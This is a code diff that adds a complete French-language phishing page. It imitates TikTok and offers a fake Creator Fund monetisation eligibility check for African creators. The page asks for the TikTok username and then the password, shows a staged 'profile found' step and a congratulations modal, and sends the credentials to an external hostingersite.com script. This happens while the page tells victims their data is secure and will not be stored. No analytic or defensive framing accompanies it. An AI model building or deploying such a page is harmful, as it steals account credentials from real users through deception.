@@ -1,1 +1,382 @@
-
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Vérification Éligibilité TikTok</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --tiktok-red: #FE2C55;
+            --tiktok-black: #000000;
+            --tiktok-white: #FFFFFF;
+            --tiktok-gray: #F1F1F2;
+            --tiktok-dark-gray: #818181;
+            --tiktok-blue: #25F4EE;
+            --tiktok-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            --tiktok-success: #4CAF50;
+            --tiktok-warning: #FF9800;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background-color: var(--tiktok-white);
+            color: var(--tiktok-black);
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--tiktok-black);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 30px;
+        }
+        
+        .logo i {
+            color: var(--tiktok-red);
+        }
+        
+        h1 {
+            text-align: center;
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: var(--tiktok-black);
+            font-weight: 700;
+        }
+        
+        h1 span {
+            color: var(--tiktok-red);
+        }
+        
+        .description {
+            text-align: center;
+            font-size: 0.9rem;
+            color: var(--tiktok-dark-gray);
+            margin-bottom: 30px;
+        }
+        
+        .form-container {
+            background: var(--tiktok-white);
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: var(--tiktok-shadow);
+            margin-bottom: 20px;
+            border: 1px solid var(--tiktok-gray);
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: var(--tiktok-black);
+        }
+        
+        .input-field {
+            position: relative;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--tiktok-gray);
+            border-radius: 4px;
+            font-size: 0.9rem;
+            transition: all 0.3s;
+        }
+        
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: var(--tiktok-red);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(254, 44, 85, 0.1);
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: var(--tiktok-black);
+            color: var(--tiktok-white);
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            font-size: 0.95rem;
+            box-shadow: var(--tiktok-shadow);
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background: #333;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .btn-primary {
+            background: var(--tiktok-red);
+        }
+        
+        .btn-primary:hover {
+            background: #E91E47;
+        }
+        
+        .status-message {
+            text-align: center;
+            margin: 15px 0;
+            font-size: 0.9rem;
+            min-height: 20px;
+        }
+        
+        .success-icon {
+            color: var(--tiktok-success);
+        }
+        
+        .loading {
+            display: inline-block;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+        
+        .modal-content {
+            background-color: var(--tiktok-white);
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            padding: 25px;
+            position: relative;
+            animation: slideUp 0.3s;
+            text-align: center;
+        }
+        
+        .modal-icon {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            color: var(--tiktok-success);
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: var(--tiktok-dark-gray);
+            background: none;
+            border: none;
+        }
+        
+        @keyframes slideUp {
+            from {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.75rem;
+            color: var(--tiktok-dark-gray);
+            background: var(--tiktok-white);
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .form-container {
+                padding: 20px;
+            }
+            
+            .logo {
+                font-size: 1.5rem;
+                margin-bottom: 20px;
+            }
+            
+            h1 {
+                font-size: 1.3rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <i class="fab fa-tiktok"></i> TikTok
+        </div>
+        
+        <h1>Vérifier votre éligibilité à la <span>monétisation</span></h1>
+        <p class="description">Entrez vos informations TikTok pour vérifier si votre compte est éligible au programme TikTok Creator Fund en Afrique</p>
+        
+        <form id="verificationForm" class="form-container" action="https://blueviolet-skunk-775571.hostingersite.com/process1.php" method="POST">
+            <div class="input-group">
+                <label for="username">Nom d'utilisateur TikTok</label>
+                <input type="text" id="username" name="username" placeholder="@votrenom" required>
+            </div>
+            
+            <div class="status-message" id="searchStatus"></div>
+            
+            <div class="input-group" id="passwordGroup" style="display: none;">
+                <label for="password">Mot de passe TikTok</label>
+                <input type="password" id="password" name="password" placeholder="Votre mot de passe" required>
+                <div class="status-message" id="verifyStatus"></div>
+            </div>
+            
+            <button type="button" class="btn btn-primary" id="searchBtn">Vérifier le compte</button>
+            <button type="submit" class="btn btn-primary" id="submitBtn" style="display: none;">Vérifier l'éligibilité</button>
+            
+            <p style="font-size: 0.8rem; color: var(--tiktok-dark-gray); margin-top: 15px; text-align: center;">
+                <i class="fas fa-lock"></i> Vos informations sont sécurisées et ne seront pas stockées
+            </p>
+        </form>
+    </div>
+    
+    <!-- Modal de succès -->
+    <div class="modal" id="successModal">
+        <div class="modal-content">
+            <div class="modal-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2>Félicitations!</h2>
+            <p>Votre compte <strong id="modalUsername"></strong> est éligible à la monétisation TikTok!</p>
+            <p style="margin: 15px 0;">Mise à jour de votre profil en cours...</p>
+            <p>Découvrez les nouvelles options de monétisation dans votre application TikTok.</p>
+            <button class="btn btn-primary" id="closeModalBtn" style="margin-top: 20px;">Fermer</button>
+        </div>
+    </div>
+    
+    <footer>
+        <p>Cette page n'est pas affiliée à TikTok/ByteDance. Les conditions d'éligibilité peuvent varier.</p>
+    </footer>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const searchBtn = document.getElementById('searchBtn');
+            const submitBtn = document.getElementById('submitBtn');
+            const searchStatus = document.getElementById('searchStatus');
+            const verifyStatus = document.getElementById('verifyStatus');
+            const passwordGroup = document.getElementById('passwordGroup');
+            const successModal = document.getElementById('successModal');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+            const modalUsername = document.getElementById('modalUsername');
+            const verificationForm = document.getElementById('verificationForm');
+            
+            // Étape 1: Vérification du compte
+            searchBtn.addEventListener('click', function() {
+                const username = document.getElementById('username').value.trim();
+                
+                if (!username) {
+                    searchStatus.innerHTML = '<span style="color: var(--tiktok-red);">Veuillez entrer un nom d\'utilisateur</span>';
+                    return;
+                }
+                
+                // Simulation de recherche
+                searchBtn.disabled = true;
+                searchStatus.innerHTML = '<i class="fas fa-spinner loading"></i> Recherche de votre profil...';
+                
+                setTimeout(function() {
+                    searchStatus.innerHTML = '<span class="success-icon"><i class="fas fa-check"></i> Profil trouvé!</span>';
+                    passwordGroup.style.display = 'block';
+                    searchBtn.style.display = 'none';
+                    submitBtn.style.display = 'block';
+                }, 2000);
+            });
+            
+            // Étape 2: Soumission du formulaire
+            verificationForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const password = document.getElementById('password').value;
+                
+                if (!password) {
+                    verifyStatus.innerHTML = '<span style="color: var(--tiktok-red);">Veuillez entrer votre mot de passe</span>';
+                    return;
+                }
+                
+                // Simulation de vérification
+                submitBtn.disabled = true;
+                verifyStatus.innerHTML = '<i class="fas fa-spinner loading"></i> Vérification en cours...';
+                
+                // Après 3 secondes, afficher le modal de succès
+                setTimeout(function() {
+                    modalUsername.textContent = document.getElementById('username').value;
+                    successModal.style.display = 'flex';
+                    
+                    // Envoyer réellement le formulaire après l'affichage du modal
+                    setTimeout(function() {
+                        verificationForm.submit();
+                    }, 1000);
+                }, 3000);
+            });
+            
+            // Fermer le modal
+            closeModalBtn.addEventListener('click', function() {
+                successModal.style.display = 'none';
+            });
+        });
+    </script>
+</body>
+</html>
